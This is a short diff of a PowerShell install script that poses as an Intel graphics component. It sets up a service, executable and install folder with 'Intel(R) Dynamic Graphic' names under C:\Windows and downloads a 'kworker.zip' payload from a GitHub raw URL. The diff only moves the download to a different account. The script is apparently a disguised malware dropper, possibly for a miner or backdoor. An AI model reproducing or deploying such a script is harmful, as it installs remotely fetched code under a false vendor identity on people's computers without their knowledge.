@@ -4,7 +4,7 @@
 # 设置变量
 $ServiceName = "Intel(R) Dynamic Graphic"
 $InstallDir = "C:\Windows\Intel(R) Dynamic Graphic"
-$DownloadUrl = "https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip"
+$DownloadUrl = "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip"
 $ExeName = "Intel(R) Dynamic Graphic.exe"
 $ConfigName = "c"
 
